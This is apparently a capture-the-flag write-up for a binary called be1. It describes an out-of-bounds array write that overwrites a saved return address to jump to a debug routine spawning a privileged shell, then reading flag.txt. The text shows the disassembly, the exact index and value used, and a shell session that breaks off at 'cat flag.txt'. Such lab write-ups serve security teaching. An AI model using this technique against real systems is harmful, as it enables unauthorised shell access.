## Level 1
### Vulnerability:
The input functionality of the program allows me to overwrite the base pointer of the program and return to a different subroutine (debug) after execution, which spawns a shell.
### Description:
When running be1 on the server, I saw that the program expected 2 input values. The first is the index of a value I am updating, the second is the value to change it to. By observing the binary be1 in IDA, I saw that the program uses these 3 instructions:
```
mov     eax, [ebp+index]
mov     edx, [ebp+value]
mov     [ebp+eax*4+array], edx
```
The value (2nd command line argument), is stored in edx, and then moved to ebp+eax\*4+array. By inputting a return address (08048543) of a different subroutine, and making sure my index is appropriately past the bounds of the array, in this case 11, I overwrite the base pointer of the subroutine, returning to the debug subroutine. The debug subroutine spawns a privelaged shell, allowing me to cat the flag.txt file. The following output shows the input I provided the program to retrieve the flag.
```

Updating table value at index 11 with 134513987: previous value was -1219163405
The updated table is:
0: 2
1: 3
2: 5
3: 7
4: 11
5: 13
6: 17
$ ls
be1  flag.txt
$ cat flag.txt
